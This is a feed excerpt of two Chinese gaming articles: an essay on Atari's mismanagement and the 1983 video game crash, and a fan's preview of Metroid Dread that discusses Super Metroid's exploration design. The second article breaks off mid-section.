[{"title":"雅达利是怎么把自己「折腾至死」的？","date":"2021-10-08 06:33:44","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>20 世纪 80 年代是一个全世界都在「折腾」的年代，方兴未艾的游戏业界也不例外。80 年代初，债台高筑的任天堂折腾出了 Game &amp; Watch 和 FC 红白机，不但一举扭转颓势，并且开始大举进军家用游戏机行业，夸下了「两年卖出三百万台」的海口 —— 尽管全日本当年的家用游戏机总销量都还没达到这个数字。虽然山内溥的发言在任天堂社内也被当成疯话，但是相对于大洋彼岸的游戏机巨头雅达利来说，这种「折腾」的「格局」显然还是小了点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0ilb34teh5fkveag.jpeg\"><figcaption>Atari 2600 的装机量庞大到每三个美国家庭就拥有一台该型游戏机。</figcaption></figure><h2>「旧日支配者」的「格局」有多大？</h2>\n<p>作为二十世纪七八十年代游戏业界的绝对统治者，雅达利从街机起家，后凭借着 Atari 2600 成功闯入并迅速占领了北美大陆的家用游戏机市场 （<s>依靠自家街机业务输血熬死了其他竞争对手 </s> ），公司市值从 3000 万美元一度膨胀至 32 亿美元，好不风光。</p>\n<p>起初，雅达利主要依靠移植自家的街机游戏来扩张游戏阵容，然而可移植的游戏数量毕竟有限，很快雅达利就开始组建一支专为 Atari 2600 制作游戏的开发团队。看起来，雅达利似乎已经站在了游戏业界的「风口」，拿到了软件行业的第一手「头部资源」，以游戏开发为「抓手」，以自家的街机移植作品为「护城河」，建立起了自家产品的「生态闭环」，实施了对友商产品的「降维打击」，重新制定了家用游戏机的「行业打法」，在游戏开发到发行的过程中实现了「端到端的短、平、快式处理」，进入了某种良性循环。<s> 当代互联网大厂直呼内行 。</s></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0itb34teit0pmrlg.png\"><figcaption>雅达利为 Atari 2600 平台推出的游戏数量繁多，这其中也包括少数以买断形式发售的第三方游戏。</figcaption></figure><p>互联网黑话说多了早晚要倒霉的，而雅达利的所作所为可比这些所谓的「黑话」还要黑得多。得益于自身的强大财力和无与伦比的市场号召力，Atari 2600 的游戏开发进程相当顺风顺水 —— 当然，这只是对雅达利而言。在突飞猛进的业绩之下，是雅达利对软件开发部门近乎「残忍」的层层盘剥。</p>\n<h3>「臭写代码的，上雅达利要饭来了？」</h3>\n<p>1980 年，雅达利的创始人诺兰·布什内尔（Nolan Bushnell）已经离开，时任雅达利 CEO 的是从母公司时代华纳空降而来的雷蒙·凯撒（Raymond Kassar），作为一个老美利坚、正星条旗的职业经理人，凯撒是一个不折不扣的实业家，却不是一个懂得和尊重技术的人。众所周知，「DC 最大的敌人是华纳」，而这句话套用到雅达利身上也同样合适。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0j5b34teh3cl8md0.jpeg\"><figcaption>雅达利的崩溃与雷蒙·凯撒唯利是图的商业策略脱不了干系。</figcaption></figure><p>为了保证雅达利在游戏软件上的数量优势和内容独占，凯撒对软件开发部门的压榨不能说是毫无人性，至少也可以说是惨绝人寰。凯撒自打内心深处就瞧不起这些为雅达利呕心沥血的开发人员，认为他们只是一群会敲打键盘的嬉皮士。他要求开发人员夜以继日地工作，连最基本的休息时间都被压缩到最低限度，而开发者却不能从自己制作的游戏中获得半点好处，甚至都不能在包装上拥有自己的姓名。在精神和肉体的双重摧残下，越来越多的开发者表现出了自己的不满。</p>\n<h3>「那我走？」</h3>\n<p>从雅达利出走的「嬉皮士」中不乏极具冒险精神和创新思维的人。在离职的愤怒和沮丧之后，大卫·克雷恩（David Crane）、拉里·卡普兰（Larry Kaplan）、阿兰·米勒（Alan Miller）和鲍勃·怀特海德（Bob Whitehead）这四位雅达利的前工具人迅速达成了共识，他们的对话可以被浓缩成以下内容：</p>\n<blockquote>\n<p><i>「靠我们自己，能不能挣钱？」</i></p>\n<p><i>「能挣，家里。」</i></p>\n<p><i>「靠开发游戏，能不能挣钱？」</i></p>\n<p><i>「能挣，跪着。」</i></p>\n<p><i>「我们自己开发游戏，能不能站着把钱给挣了？」</i></p>\n</blockquote>\n<p>于是，几位快被雅达利薅秃了的程序员把心一横，决定反过来狠狠薅雅达利一把羊毛。就这样，今天为人所熟知的动视（Activision）在 1979 年正式成立。<strong>作为史上首个第三方游戏发行商，动视打破了「硬件制造商包办软件发行」的行业规则</strong>，于雅达利之外独立发行自己开发的 Atari 2600 游戏，借机瓜分雅达利的软件利润。动视开发的游戏本身素质过硬，加之蹭到了雅达利垄断之下的庞大市场，动视在成立后的不久就赚的盆满钵满，这很快引起了「老东家」的关注。</p>\n<h2>「旧日支配者」的「气度」有多小？</h2>\n<p>早在 1980 年 1 月的 CES 展会之后，雷蒙·凯撒就写信警告过动视不要打雅达利的主意，然而此时的动视早已通过逆向破解的方式制造出了自己的 Atari 2600 开发机，并开始着手建立销售网络；3 月份，动视公开了他们开发的四款首发游戏，明摆着就是要和雅达利死磕到底。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/ce61c05b69d51df1a2273971a4f110c1.png\"><figcaption>《Pitfal!》是由动视开发和发行的首款游戏，也是 Atari 2600 平台上最畅销的作品之一。</figcaption></figure><p>1980 年 5 月，怒不可遏的雅达利用一纸诉状将动视告上了法庭。雅达利认为动视的做法破坏了自己的游戏开发、发行与销售业务，对自己的合法权益造成了严重损害，并在法庭上一再强调动视逆向破解 Atari 2600 和在未经许可的情况下制作和发行游戏软件的行为属于犯罪，诉求勒令动视即刻停止一切侵权行为，并且支付高达两千万美元的赔偿金。</p>\n<p>显然，雅达利法务部没有迪士尼法务部的「超能力」，他们的如意算盘是动用「钞能力」，在赔偿金额上狮子大开口，以这种方法「哄抬」官司成本，企图以高额的诉讼费用拖垮对手。这样，动视即使胜诉，却也要付出一笔惨痛的代价，足以令其一蹶不振，永无翻身之地。然而，令雅达利想不到的是，动视的扩张速度远超他们的想象。</p>\n<h3>「谁有钱就挣谁的！」</h3>\n<p>时任动视 CEO 的吉姆·莱维（Jim Levy）此前曾从事出版行业，也有在唱片公司的工作经历，所以他的经营策略也更加偏向对游戏和开发者的包装，很有如今「饭圈」的那一套。莱维认为「游戏开发者也是艺术家」，也乐于给开发者以艺术家的待遇，动视发行的游戏会在包装盒上印刷开发者的签名照和寄语，并且还会介绍游戏开发的背景故事和幕后「花絮」。<strong>莱维的理念不仅激励了被雅达利长期压迫的游戏开发者，也促进了开发者与玩家在屏幕之外直接或间接的互动，改变了以往游戏行业照搬传统出版物进行宣发活动的老套做法</strong>。</p>\n<p>接下来的剧情似乎毫无悬念，1980 年 7 月，动视的四款首发游戏上市，在玩家间受到了前所未有的热烈欢迎，这家一开始只有八名员工的小公司在一年之内的收入高达 650 万美元，雅达利的计划在动视的成功面前不攻自破，此时摆在其面前的就只剩下了一条路。</p>\n<h3>「让子弹飞一会。」</h3>\n<p>事情到了这个地步，无论是对雅达利还是对动视来说，这场诉讼的结果都变得尤其重要。<strong>对于刚在游戏行业站稳脚跟的动视来说，赢得诉讼就等于名正言顺的拿到了市场准入的通行证；而对于财大气粗的雅达利来说，输掉诉讼就相当于为自己在市场的长期垄断刻下了墓志铭</strong>。商业竞争并无高尚和卑鄙之分，但如果比较动视和雅达利各自所处的地位和表现出的姿态，这场诉讼显然更像是屠龙者与恶龙之间的较量。</p>\n<p>1981 年 11 月，雅达利和动视之间漫长的官司终于落下帷幕，法院认为雅达利基于其市场支配地位、出于排除和限制竞争的目的所提出的诉求违反了反托拉斯法的相关规定，故驳回其诉求，宣判雅达利败诉。<strong>作为英美法系国家，美国的判例法制度源远流长，所以雅达利的败诉发出了一个极其重要的信号 —— 即任何人都可以在美国合法的开发和销售 Atari 2600 平台的游戏软件。</strong>诉讼结果让雅达利垄断下的游戏市场从此门户洞开，作为赢家的动视自然成为了受益方，但在判例之下，无数觊觎着雅达利财产的眼睛也开始蠢蠢欲动。</p>\n<h2>「旧日支配者」的「心思」有多坏？</h2>\n<p>几乎是在一夜之间，无数曾被雅达利拒之门外的游戏开发商「如闪电般归来」，并迅速展开了与雅达利的单方面「跨界联动」，企图在动视胜诉的「风口」上分一杯羹。虽然新晋的第三方游戏中不乏佳作，但这些优质游戏的数量相对于涌入市场的粗制滥造和鱼目混珠之作来说只是杯水车薪。在那个游戏媒体还不甚发达的年代，玩家们要判断一款游戏的优劣只能依靠口口相传，然而在面对几乎挤爆了货架的陌生游戏时，这种方法很快失去了使用价值。</p>\n<p>从此，买卡带变成了「开盲盒」，而玩家想要在如此恶劣的环境下买到一个质量还行的新游戏，其难度不亚于抽到盲盒的「隐藏款」。同时，一些包含暴力、血腥、色情元素，甚至带有强烈种族主义色彩和极端主义倾向的游戏都堂而皇之地出现在了雅达利的游戏机上，这口黑锅自然也一并被舆论扣在了雅达利的身上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jlb34teh5fkvebg.jpeg\"><figcaption>自雅达利败诉之后，Atari 2600 上充斥着各种滥竽充数之作。</figcaption></figure><p>从此，整个北美大陆的游戏市场开始了「劣币驱逐良币」的恶性循环，刚刚闯入陌生市场的游戏开发商学不会动视对游戏品质的严格把控，却在极短的时间内熟练掌握了动视在游戏宣发上的精髓。游戏卡带的包装越来越精美，故事越编越动人，IP 越来越重量级，游戏内容却越来越枯燥乏味，<s> 像极了现在的手游行业 </s> 。然而，面对已经开始失控的市场，雅达利依然不肯放下身段，而是转而制定了更加激进的策略。</p>\n<h3>「 I have a plan! A big! Plan! 」</h3>\n<p>为了转嫁矛盾，雅达利转而开始向销售网络中的分销商和零售商施压，逼迫这些商家订购超出需求的卡带数量，以消化过分积压的库存。但商家不是傻瓜，雅达利销售网络中的商家为了规避风险和扩大规模，也同时订购和销售第三方的卡带，这似乎构成了一种双赢的局面，看上去雅达利减轻了库存压力，第三方游戏开发商拓宽了销售渠道，所有人都很高兴 —— 除了玩家。</p>\n<p>不满的情绪开始在玩家群体中蔓延，但首先撑不住的不是玩家，而是商家。雅达利庞大的体量下近乎「恐怖」的产能和库存数量并非是向商家强行摊派就能解决的，况且雅达利此举的目的是为了更新自家的游戏阵容，从而保持对第三方游戏开发商的竞争力。因此，雅达利在消化库存的同时也在变本加厉的生产新的卡带，而与此同时，大量的第三方游戏依然在疯狂的涌入市场，所有卖不出去的卡带最后全部变成了压在商家身上的沉重负担。<strong>整个游戏市场就像暴雨中即将决堤的河流，无数的淘金者逆流而上，所有人都想在这条浑水中多捞一笔，却没有一个人发现那座即将溃于蚁穴的千里之堤</strong>。</p>\n<h3>「团长，车子已经准备好了！」</h3>\n<p>大家都很高兴的 1982 年一直高兴到了年末，然后就高兴不下去了。在雅达利第一方与第三方游戏的「通力协作」下，销售网络的承压能力和混乱程度已经达到了极限，雅达利不知道有多少商家依然在销售自己的游戏，而商家也不知道自己到底和雅达利等开发商签下了多少订单，可谓是「兵不识将，将不识兵」，宋太祖一定没想到自己的国策竟然被一千年以后的美国资本家给玩明白了。</p>\n<p>事情发展到如此地步，是个明眼人都已经看出了这其中的门道，商家开始将已订购的卡带做退货处理，但雅达利并未把退回的卡带从总销售额中扣除。这种人为营造的「虚假繁荣」进一步恶化了市场环境，粗制滥造的游戏已经泛滥成灾，玩家的情绪就像巴尔干半岛上的火药桶，但谁也没有想到，这一年的圣诞节则成为了半岛上的「萨拉热窝」。</p>\n<h2>「旧日支配者」的「终局」有多惨？</h2>\n<p>阿兰·摩尔（Alan Moore）的漫画《致命玩笑》中，小丑在 1985 年的圣诞夜用一支转轮手枪将芭芭拉打入了 ICU；而现实世界中，霍华德·斯科特·华沙（Howard Scott Warshaw）在 1982 年的圣诞夜用一部《E.T.》游戏把雅达利钉上了耻辱柱。</p>\n<p>由史蒂芬·斯皮尔伯格（Steven Allan Spielberg）执导，于1982 年 6 月上映的《E.T.》电影是科幻电影史上的里程碑。在流媒体尚未出现的 80 年代，这部电影的受欢迎程度远超如今的所谓互联网「顶流」。雅达利「最大的敌人」—— 时代华纳自然不会放过蹭这个 IP 的机会，为了拿到电影改编权，也为了顺道拯救雅达利的销量，时代华纳开始频繁与环球影业和斯皮尔伯格接触，因为雅达利此前制作过斯皮尔伯格的另一部电影《夺宝奇兵》的改编游戏，其销量和口碑都相当不错，所以时代华纳没费多大力气（<s>也就砸了 2000 万美元</s>）就拿到了《E.T.》电影的改编权。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jtb34teh3cl8mdg.jpeg\"><figcaption>从精美的《E.T.》游戏海报及其展示的包装封绘上可以看到时代华纳和雅达利对这款游戏的莫名自信。</figcaption></figure><h3>「致命玩笑」</h3>\n<p>雅达利上下对《E.T.》这个千载难逢的 IP 充满期待，为了表示诚意，雅达利高层决定让《夺宝奇兵》游戏的制作人霍华德负责这个项目。在 20 万美元薪酬和免费度假的许诺后，雅达利提出了唯一的要求：整个游戏要在五周之内开发完毕。</p>\n<p>摆在霍华德面前的只有两条路：要么拿着 20 万美元去夏威夷，要么抱着铺盖卷走人回家。虽然老板提出的要求实在过于阴间，但霍华德做出了一个碳基生物应有的选择。在霍华德夜以继日进行着开发工作的时候，时代华纳和雅达利正忙着为这部连他们自己都还不知道长什么样子的「旷世巨作」广而告之。报刊、杂志、广播、电视，甚至街边的商店橱窗商都挤满了《E.T.》游戏的广告，简直可以算作精神污染。</p>\n<p><strong>《E.T.》游戏从立项到完成的过程很像现在的一些现象级手游，开发商花重金砸下热门 IP，又极尽所能的为其造势铺路，唯独不肯在游戏开发上多下心思，其后的口碑和销量一落千丈直至黯然离场也是可以轻易预见的</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0k5b34teh5fkvec0.png\"><figcaption>《E.T.》游戏的这口黑锅实在不该由开发者霍华德来背。</figcaption></figure><p>1982 年的圣诞节，《E.T.》游戏如期上架，雅达利没有像自己的电视广告里一样给全美国的孩子们一个大大的「Surprise」，而是以极为低劣的游戏质量给了所有人一个大大的「Surprise Mother F**ker」。<strong>有人认为《E.T.》游戏是开发者霍华德对雅达利的无声报复，实际上，《E.T.》游戏的完成度对于只有五周的开发时间来说已经相当之高，被称作「史上最烂游戏」并非完全出于对游戏质量的评价，主要原因还是因为其实机表现和广告宣传的强烈反差，以及百万销量带来的知名度</strong>。</p>\n<p>如果要客观的评价《E.T.》游戏，倒不如直接问问游戏行业的从业者。</p>\n<blockquote><p>要在五周时间内开发一款 3A 大作是什么样的体验？</p></blockquote>\n<h3>「凛冬将至」</h3>\n<p>玩家群体的怒火终于在 1982 年圣诞节的雪夜爆发，已经售出的上百万张卡带中有不少在当夜就已经「横尸街头」。过于乐观的雅达利对《E.T.》游戏的备货相当充足，在圣诞节前加急生产的四百万张卡带除去上述的一百万张之外，剩下的全部积压在商家的货架上和雅达利自己的仓库里，即使打折幅度堪比 Steam 特卖也依然没人买账。<strong>受够了「欺诈式营销」的玩家从此失去了对雅达利乃至整个游戏行业的最后一点信任，无数的游戏机和卡带在一夜之间变成了无人问津的电子垃圾；深感市场前景一片灰暗的投资方纷纷也与游戏产业一刀两断，既为亡羊补牢，也为明哲保身；而借此机会不断唱衰电子游戏的媒体则在舆论上声讨雅达利长久以来的无耻行径，持续数月的「饱和打击」之下，整个北美的游戏市场变得如同废土一般死寂</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/552544fdf7b5fb2a50861eef3f4451b3.png\"><figcaption>雅达利的时代随着无数滞销的卡带一并，被人遗忘在了新墨西哥州阿拉莫戈多垃圾场的茫茫沙海之中。</figcaption></figure><p>在这场被命名为「雅达利冲击」的大崩溃中，雅达利既首当其冲，又难逃其咎。但是对于雅达利来说，数十亿的资产蒸发倒还是小事，此时最重要的是时代华纳的态度。但这位一手制造了当下局面的「始作俑者」并未显露出一丝愧疚，时代华纳只是瞟了一眼形如败犬的雅达利，就像雅达利瞟向那些曾为自己呕心沥血的开发人员一样。此时此刻，雅达利也只剩下了一句话。</p>\n<h2>「那我走？」</h2>\n<p>雅达利的崩溃直接导致了时代华纳的股价大跌，时任时代华纳 CEO 的史蒂夫·罗斯（Steve Ross）决定将雅达利拆分出售以缓解经营压力。曾经的雅达利从此一分为二，变成了雅达利集团和雅达利游戏，前者于 1984 年 7 月被出售给了 Commodore 的创始人杰克·特拉梅尔（Jack Tramiel），而后者则于 1985 年 2 月被南梦宫收购。归于南梦宫麾下的雅达利游戏并没有就此销声匿迹，在不久之后，这家脱胎于游戏巨头雅达利的「天选之子」将在大洋彼岸再次掀起游戏业界的一片腥风血雨 —— 不过，那就是另一个故事了。</p>\n<h2>参考文献</h2>\n<ul>\n<li><a href=\"https://www.163.com/ent/article/CM6PJUKU00318QE8.html\" target=\"_blank\">北美主机市场的崩溃，罪魁祸首竟是动视？</a></li>\n<li><a href=\"https://www.gcores.com/articles/131144\" target=\"_blank\">动视的四十一年（上）| 机核 GCORES</a></li>\n<li><a href=\"https://www.yystv.cn/p/958\" target=\"_blank\">史上最烂游戏表示：雅达利倒闭这个锅我不背 - 游研社</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Atari\" target=\"_blank\">Atari – Wikipedia</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Activision\">Activision – Wikipedia</a></li>\n<li>本文部分图片来自 <a href=\"https://www.gcores.com/\" target=\"_blank\">机核网</a> 与 <a href=\"https://zh.wikipedia.org/\">维基百科</a>\n</li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69078"},{"title":"如何评价 10 月 8 日正式发售的 Switch OLED 的护航游戏《密特罗德 生存恐惧》？","date":"2021-10-08 05:29:00","description":"\n<p>刚刚玩了两个小时，难度一般，存档点设置也比较充分，一开始的操作教程也比较详细，操作极其流畅，键位设计也很合理。</p>\n<p>现在看来游戏的难度集中在BOSS战与EMMI区，不过进入这两个环节前都有自动存档。一开始可能的确有点难（主要是不熟悉操作），练几次掌握规律就行(emmi区熟了都可以绕着EMMI玩 )</p>\n<hr>\n<p>《密特罗德/银河战士 生存恐惧》媒体评分解禁，当前MC平均88分，收录47家媒体。</p>\n<p>IGN 9分，GameSpot 8分，GameInformer 9分。 ​​​</p>\n<hr>\n<p>目前游戏在国内热度很低（国外热度还行，亚马逊上卖得很好，美亚已经出现了实体版预售一空的情况），电商平台价格也很稳定，知乎上也鲜有人提过与<b>《密特罗德 生存恐惧》</b>（Metriod Dread/Metriod 5  下面简称<b>M5</b>）相关的问题。于是这次打算用自己拙劣的语言自问自答一下，也算是在游戏发售前先占个坑。</p>\n<p>M5要等到国庆结束后的10月8日正式发售（日企果然不懂什么叫国庆节与打工人……），所以作为一个密特罗德粉丝，先简要谈谈对本作的期待吧，游戏解锁后再进行对游戏内容的简要评测。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2d23522daed7fd0ab543efd1f547c4bf_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2d23522daed7fd0ab543efd1f547c4bf\" data-watermark-src=\"v2-ee384af3c062b830ce732f9bc3f601a0\" data-private-watermark-src=\"v2-6ba3d58a52c2016ba1c999aacb76c986\"></p>\n<p><br></p>\n<hr>\n<p>当我观看完了所有的介绍视频时，我对M5产生的预期是“<b>一作同时拥有《超级密特罗德》的探索感、《融合》的恐惧感、《萨姆斯归来》的动作感的密特罗德</b>”。</p>\n<p>我知道这样的预期是不科学的，因为一个同时拥有这三种特质的Metroidvania游戏是不可能存在的。如果M5真就同时做到了这三点，那一举成为比肩《超级密特罗德》的新里程碑式银河城游戏应该不成问题。不过就算M5没达到我的预期，那也有《萨姆斯归来》托底（总不可能比萨归差吧）。</p>\n<p>现阶段，无论是官方给出的实机预告，还在媒体进行的早期试玩评测，双方给出的信息是极其正面的，因而一次次地拔高了我的期待值（虽然真的很想自行降低期望值，免得吹死婊活），我对M5的预期也从“一部略好于萨归的作品”变成了“同时拥有三种特质的系列正统续作”。</p>\n<p>下面具体说说我的预期究竟是怎么来的，顺便介绍一下这三部老密特罗德作品。</p>\n<hr>\n<p><img src=\"https://pic3.zhimg.com/v2-687980e2d70006ba558f0750b510b24f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"《超级密特罗德》\" data-watermark=\"watermark\" data-original-src=\"v2-687980e2d70006ba558f0750b510b24f\" data-watermark-src=\"v2-bbcfea3c32b63e3946cd467bf68323a4\" data-private-watermark-src=\"v2-96f7584d73a4d658059e1cccaba51a6b\"></p>\n<h2>《超级密特罗德》的探索感</h2>\n<p>《超级密特罗德》是一款伟大的游戏。</p>\n<p>毫不客气地说，这款1994年发售于SNES平台的\"古董游戏\"，直至今天依然是最好的Metroidvania游戏。</p>\n<p>作为任天堂密特罗德系列的正统第三作，它不仅一举打破了玩家群体对任天堂只会出妇孺游戏的刻板印象，其氛围之恐怖，背景音之惊悚，使其一度成为不少从SNES入坑的玩家的“童年阴影”。同时，《超级密特罗德》实现了对系列前作的全方面超越，无论是强化的音画效果，空前复杂的联通式大地图，还是打磨精良的操作手感，都将这个系列推上了一个全新的高度。</p>\n<p>作为银河城类型的开拓者与完善者，《超密》也一举成为了日后无数类银河城游戏的学习模板，其优秀的设计理念也影响了诸如《月下夜想曲》与《公里边缘》等游戏的诞生，成为了玩家们争相追捧的神作之一。</p>\n<p>而《超级密特罗德》之所以伟大，其核心在于它<b>高自由度下的惊人的探索感</b>，可以说《塞尔达传说 旷野之息》在2017年所带给玩家的一切，它在23年前就已经震撼过玩家一次了。</p>\n<p><b>对于Metroidvania游戏来说，对玩家一定程度上的限制是必须的</b>，比如给出唯一的探索道路，或者设置一个只有高等级才打的过的BOSS，这样做能够更好地控制流程的推进，把握游玩的节奏，也有便于设计一些流程脚本化的演出，更好地完成叙事任务，保证玩家在制作者规划好的道路上行进。</p>\n<p>《超级密特罗德》也不例外：<b>在游戏初期，主线推进的次序基本上是唯一的</b>（当然高手可以用高阶技巧走出不同的道路），看似左右都可以走，实际上右边因为没有球炸而过不去；明明左右都是门，却只有底下的那个才能通行。走到一个未知的地方，想返回却发现回去的路被堵上了，只能硬着头皮往前走，最后发现前方有裂缝的砖块是可以用子弹清除的，由此找到了新的道路……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9e8532aa43b826eeeb81744e6b0ec2b0_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"逛了半天才发现，只有最下面的门能走，其他的门不是通向一条死路就是直接打不开\" data-watermark=\"watermark\" data-original-src=\"v2-9e8532aa43b826eeeb81744e6b0ec2b0\" data-watermark-src=\"v2-d7ec47e3d9be0ef48ab3a20fbcba280b\" data-private-watermark-src=\"v2-b5c4c9807bc66caacbe94b43287dd1bd\"></p>\n<p>制作组在对初期流程进行限制的同时，很聪明地使用了一些<b>“无言”的指引</b>：有裂缝的砖块，不同颜色的门，地图上多出来的房间等等，让玩家以为是凭借自身的智慧探索与发现新区域的，而没有那种被制作组牵着鼻子玩游戏的感觉。</p>\n<p>不仅仅是初期流程，除了游戏开头介绍故事背景时用了文字说明外，《超密》几乎不存在任何文字指引，这与很多银河城游戏生怕你找不到路而疯狂给你文字指引的设计截然不同。取而代之的是大量精心设计的一些地形与物体指引，对于一些比较难用能力，制作组还非常贴心地设计了一些天赋异禀的“神奇动物”们，它们会演示这些能力的使用方法，从而大大提高玩家的探索能力。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75f7a43add38ad799d27d7860460262a_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"冲刺界的“百米冠军”——绿鸵鸟\" data-watermark=\"watermark\" data-original-src=\"v2-75f7a43add38ad799d27d7860460262a\" data-watermark-src=\"v2-f93d4939f23652e40f1f83c9fab00cc2\" data-private-watermark-src=\"v2-e997ae64083889b67e51c97c3686e8ac\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b766a4f14ab9ab542da1fededb307b95_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"成群结队地羞辱不会踢墙跳的你\" data-watermark=\"watermark\" data-original-src=\"v2-b766a4f14ab9ab542da1fededb307b95\" data-watermark-src=\"v2-538d9b1a3cd902ab33688bb99cd00a07\" data-private-watermark-src=\"v2-b1e6106bfd9173873dca5d79cd416458\"></p>\n<p>当然，仅仅是一味地玩家的流程进行必要的限制，并采用一些巧妙的指引手段，《超级密特罗德》还不足以成为一部神作。</p>\n<p>所谓的“探索”是真正属于玩家自己的，而不是被制作组刻意安排好的，营造出来的“探索感”。制作组也非常清楚这一点，没有一直“圈养”着玩家，他们一直在等待一个机会，一个可以真正让玩家突破栅栏的机会。</p>\n<p>于是，当你在熔岩地区拿到加速鞋与电光索，又经过重重阻碍，打过几个BOSS拿到冰冻枪与超级炸弹后，你会惊奇地发现之前无法通过的阻碍可以用新能力消除，冰冻枪甚至可以通过冰冻小怪来造出一条蜿蜒上升的道路。最后，玩家在地下绕了半天，爬上地表后又回到了最初飞船停靠的地方，你会发现这刚刚经历的一切只是制作组设计的大型新手教程。终于，制作组在这时放开了双手，仿佛你已经具备了足够的能力，是时候让你开始一段“真正的探索”了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-045800a775f96b4ecc53b9a163063127_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"再次回到飞船时，萨姐的装甲也从橙色变成了与飞船颜色一致的黄色，预示着游戏已经迎来中后期\" data-watermark=\"watermark\" data-original-src=\"v2-045800a775f96b4ecc53b9a163063127\" data-watermark-src=\"v2-b602fcd37e5af644e2a21dbc95176e3e\" data-private-watermark-src=\"v2-ae5705e3bbe70f41d15bc1dc7343a799\"></p>\n<p><b>你已经具备了相当多的能力，你可以开始肆无忌惮地探索：之前关闭的门都可以打开，之前堵死的路都可以通过，之前没去过的地方现在也能想办法去了，世界一下子豁然开朗，你就是那个传说中的“最强战士”。</b></p>\n<p>出神入化的关卡设计从这时开始淋漓尽致地显示出来，为了达成让玩家自由探索的目标，《超密》的每一个房间的布局都是经过精心考量的，在保证单个谜题质量的前提下，许多房间都允许玩家用两种及以上不同的方式通过，从而不产生重复跑图的厌烦心理；房间与房间之间的布局也十分讲究，捷径与暗道遍布在地图的各个角落，到达一个房间的路径又可以有多种；收集品层面，既然玩家已经有了超级炸弹与X光扫描，那就加大隐藏物品的发现难度，加大玩家的操作难度，把它放在天花板的顶上，没有裂缝的石头里，或者哪个你去都没去过的僻静角落里，来保证玩家每次发现隐藏物品都有满满的成就感；对于操作熟练的高阶玩家，设计师还设计了不少需要自己摸索的高阶操作技巧，比如无限炸弹跳与水晶恢复（消耗导弹与炸弹而实现满血恢复的隐藏技能），满足了高阶玩家对速通游戏的需求。</p>\n<p>诚然，如果用现代的眼光来审视这款1994年的游戏，《超密》不是一个完美的游戏。很多物品摆放的位置不人性化，手感比较陈旧，上手难度偏高，这都是的的确确存在的问题。但是《超密》带给玩家的探索感是经久不衰的，无论什么年代。</p>\n<p>说了半天《超密》，用一句话来总结，<b>《超级密特罗德》的探索感是首先是基于一定的限制，让玩家获得探索的相关能力；再一次性放手，用高自由度的关卡设计使玩家的探索始终存在正反馈。</b></p>\n<p>说回生存恐惧，为什么我会产生这种预期，实际上是来自官网报告vol.4里的一段话：“<b>『超级密特罗德』是全系列自由度最高的一作应该不为过。本次『密特罗德 生存恐惧』，如能善用各种技巧，可感受到与『超级密特罗德』相近的自由度。各种技能与道具可以提前获取，因此可尝试不同的攻关路线。</b>”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-172f4b20a7e68d30ed0fb93ddab45d29_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-172f4b20a7e68d30ed0fb93ddab45d29\" data-watermark-src=\"v2-f8079667892ad03d58c51da259ffc2dd\" data-private-watermark-src=\"v2-c87f294027c8894ca03e678e7b9d4f69\"></p>\n<p>同样，在最近的媒体试玩的活动中，我也听到有“重拾了超密的探索感”“相关指引比较少”之类的话语，让我进一步提高了对生存恐惧的期待值。这次的关卡设计与探索感究竟如何，就等10月8号以后再见分晓吧！</p>\n<hr>\n<p><img src=\"https://pic3.zhimg.com/v2-1761885d6b92c990928dad5b57c7e451_720w.jpg?rss\" data-rawwidth=\"599\" data-rawheight=\"599\" data-size=\"normal\" data-caption=\"《密特罗德 融合》\" data-watermark=\"watermark\" data-original-src=\"v2-1761885d6b92c990928dad5b57c7e451\" data-watermark-src=\"v2-a97ffdfe8249c55cf58a66da831adc03\" data-private-watermark-src=\"v2-ab96f1122fcf2a36099a8eb204e71d0c\"></p>\n<h2>《密特罗德 融合》的恐惧感</h2>\n<p>《密特罗德 